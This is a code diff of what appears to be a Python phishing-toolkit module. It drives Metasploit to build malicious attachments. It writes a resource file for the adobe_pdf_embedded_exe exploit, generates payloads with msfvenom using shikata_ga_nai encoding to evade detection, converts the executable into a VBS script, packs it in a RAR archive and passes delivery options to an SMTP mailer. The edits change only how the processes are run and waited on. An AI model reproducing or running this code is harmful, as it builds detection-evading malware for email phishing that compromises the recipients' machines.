@@ -175,15 +175,16 @@ if exploit_counter == 0:
 	filewrite = file(setdir + "/template.rc", "w")
 	filewrite.write("use exploit/windows/fileformat/adobe_pdf_embedded_exe\nset LHOST %s\nset LPORT %s\nset INFILENAME %s\nset FILENAME %s\nexploit\n" % (rhost,lport,inputpdf,output))
 	filewrite.close()
-	subprocess.Popen("%smsfconsole -r %s/template.rc" % (meta_path, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-	while 1:
+	child = pexpect.spawn("%smsfconsole -r %s/template.rc" % (meta_path, setdir))
+	a = 1
+	while a == 1:
 		if os.path.isfile(setdir + "/template.pdf"):
 		        subprocess.Popen("cp " + users_home + "/.msf4/local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
-			break
+			a = 2 #break
 		else:
 			print_status("Waiting for payload generation to complete...")
 			if os.path.isfile(users_home + "/.msf4/local/" + outfile):
-				subprocess.Popen("cp %s/.msf4/local/%s %s" % (users_home, outfile,setdir), shell=True).wait()
+				subprocess.Popen("cp %s/.msf4/local/%s %s" % (users_home, outfile,setdir), shell=True)
 			time.sleep(3)
 
         print_status("Payload creation complete.")
@@ -198,13 +199,13 @@ if exploit_counter == 0:
         if noencode == 1:
             execute1=("exe")
             payloadname=("vb.exe")
-        subprocess.Popen("%smsfvenom -p %s %s %s -e shikata_ga_nai --format=%s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True).wait()
+        subprocess.Popen("%smsfvenom -p %s %s %s -e shikata_ga_nai --format=%s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True)
         if noencode == 0:
-            subprocess.Popen("%smsfvenom -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True).wait()
+            subprocess.Popen("%smsfvenom -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True)
         # Create the VB script here
-        subprocess.Popen("%s/tools/exe2vba.rb %s/vb.exe %s/template.vbs" % (meta_path,setdir,setdir), shell=True).wait()
+        subprocess.Popen("%s/tools/exe2vba.rb %s/vb.exe %s/template.vbs" % (meta_path,setdir,setdir), shell=True)
         print_info("Raring the VBS file.")
-        subprocess.Popen("rar a %s/template.rar %s/template.vbs" % (setdir,setdir), shell=True).wait()
+        subprocess.Popen("rar a %s/template.rar %s/template.vbs" % (setdir,setdir), shell=True)
 
     # NEED THIS TO PARSE DELIVERY OPTIONS TO SMTP MAILER
     filewrite=file(setdir + "/payload.options","w")
